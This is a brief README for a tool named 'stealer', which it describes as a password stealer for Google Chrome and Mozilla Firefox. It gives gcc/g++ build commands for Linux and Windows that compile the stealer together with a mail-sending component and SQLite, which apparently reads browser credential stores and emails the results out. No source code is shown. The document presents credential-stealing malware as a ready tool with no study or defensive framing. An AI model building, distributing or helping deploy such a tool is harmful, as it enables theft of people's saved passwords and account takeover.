# stealer

Password stealer for Google Chrome and Mozilla Firefox.

You can compile it for Linux using commands below:
```
gcc -c sqlite3.c
g++ -o <programname> stealer.cpp mailsender.cpp sqlite3.o -ldl -pthread -std=c++1z
```
  
And for Windows you have to execute following command using MinGW:
```
gcc -c sqlite3.c
g++ -o <programname> stealer.cpp mailsender.cpp sqlite3.o -std=c++1z
```
